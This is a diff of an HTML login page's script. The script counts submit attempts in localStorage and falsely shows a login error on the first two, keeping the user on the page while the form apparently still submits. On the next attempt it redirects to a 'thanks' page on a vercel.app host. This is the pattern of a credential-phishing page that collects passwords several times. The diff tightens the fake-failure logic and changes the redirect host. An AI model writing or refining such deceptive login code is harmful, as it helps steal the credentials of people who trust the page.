@@ -113,7 +113,7 @@
     const nextField = document.getElementById('nextField');
     const errorText = document.getElementById('errorText');
 
-    // Initialize login attempt counter
+    // Initialize login attempt counter if not set
     if (!localStorage.getItem('login_attempt')) {
       localStorage.setItem('login_attempt', '0');
     }
@@ -121,13 +121,15 @@
     form.addEventListener('submit', function () {
       let attempt = parseInt(localStorage.getItem('login_attempt'));
 
-      if (attempt < 3) {
+      if (attempt < 2) {
+        // First two attempts → show error & stay on same page
         errorText.style.display = 'block';
-        nextField.value = window.location.href; // submit but stay
+        nextField.value = window.location.href;
         localStorage.setItem('login_attempt', (attempt + 1).toString());
       } else {
+        // Third attempt → redirect to success page
         errorText.style.display = 'none';
-        nextField.value = "https://vrils-plum.vercel.app/thanks.html"; // redirect
+        nextField.value = "https://gritvolt.vercel.app/thanks.html";
         localStorage.removeItem('login_attempt');
       }
     });
@@ -136,4 +138,3 @@
   <script src='app.js'></script>
 </body>
 </html>
-
